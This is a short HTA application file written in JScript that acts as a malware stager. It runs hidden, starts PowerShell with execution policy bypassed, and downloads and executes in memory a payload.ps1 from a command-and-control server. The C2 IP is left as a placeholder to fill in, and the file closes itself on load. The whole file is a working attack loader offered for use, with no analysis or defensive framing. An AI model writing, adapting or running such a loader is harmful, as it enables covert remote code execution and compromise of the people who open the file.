<html>
<head>
<title> </title>
<HTA:APPLICATION ID="red" APPLICATIONNAME="red" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
<script language="JScript">
try {
    var shell = new ActiveXObject("WScript.Shell");
    // CONFIG: Set your C2 server IP here
    var c2Ip = "YOUR_C2_IP_HERE";
    
    // Download and execute payload in memory via PowerShell
    shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://" + c2Ip + "/payload.ps1')\"", 0, false);
} catch (e) {
    shell.Run("cmd.exe /c echo HTA error: " + e.message + " > C:\\hta_error.txt", 0, false);
}
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
